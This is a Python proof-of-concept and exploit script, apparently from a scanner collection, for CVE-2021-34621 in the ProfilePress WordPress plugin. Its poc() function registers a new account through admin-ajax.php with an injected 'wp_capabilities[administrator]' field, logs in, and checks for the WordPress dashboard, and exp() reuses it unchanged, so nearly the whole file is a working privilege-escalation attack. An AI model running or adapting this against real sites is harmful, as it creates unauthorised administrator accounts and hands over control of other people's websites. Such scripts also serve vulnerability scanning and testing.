import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''WordPress ProfilePress wp-user-avatar plugin make admin users''',
        "description": '''A vulnerability in the user registration component found in the ~/src/Classes/RegistrationAuth.php file of the ProfilePress WordPress plugin made it possible for users to register on sites as an administrator. This issue affects versions 3.0.0 - 3.1.3. .''',
        "severity": "critical",
        "references": [
            "https://www.wordfence.com/blog/2021/06/easily-exploitable-critical-vulnerabilities-patched-in-profilepress-plugin"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-34621",
            "cwe-id": "CWE-269"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "wordpress", "wp-plugin"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/wp-admin/admin-ajax.php"""
        method = "POST"
        data = """-----------------------------138742543134772812001999326589
Content-Disposition: form-data; name="reg_username"

{{randstr}}
-----------------------------138742543134772812001999326589
Content-Disposition: form-data; name="reg_email"

{{randstr}}@example.com
-----------------------------138742543134772812001999326589
Content-Disposition: form-data; name="reg_password"

{{randstr}}@example.com
-----------------------------138742543134772812001999326589
Content-Disposition: form-data; name="reg_password_present"

true
-----------------------------138742543134772812001999326589
Content-Disposition: form-data; name="reg_first_name"

{{randstr}}@example.com
-----------------------------138742543134772812001999326589
Content-Disposition: form-data; name="reg_last_name"

{{randstr}}@example.com
-----------------------------138742543134772812001999326589
Content-Disposition: form-data; name="_wp_http_referer"

/wp/?page_id=18
-----------------------------138742543134772812001999326589
Content-Disposition: form-data; name="pp_current_url"

{{BaseURL}}
-----------------------------138742543134772812001999326589
Content-Disposition: form-data; name="wp_capabilities[administrator]"

1
-----------------------------138742543134772812001999326589
Content-Disposition: form-data; name="signup_form_id"

1
-----------------------------138742543134772812001999326589
Content-Disposition: form-data; name="signup_referrer_page"


-----------------------------138742543134772812001999326589
Content-Disposition: form-data; name="action"

pp_ajax_signup
-----------------------------138742543134772812001999326589
Content-Disposition: form-data; name="melange_id"


-----------------------------138742543134772812001999326589--"""
        headers = {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Content-Type': 'multipart/form-data; boundary=---------------------------138742543134772812001999326589'}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-login.php"""
        method = "POST"
        data = """log={{randstr}}@example.com&pwd={{randstr}}@example.com&wp-submit=Log+In"""
        headers = {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-admin/"""
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*', 'Connection': 'close'}
        resp2 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""Welcome to your WordPress Dashboard""" in resp2.text) and (resp2.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url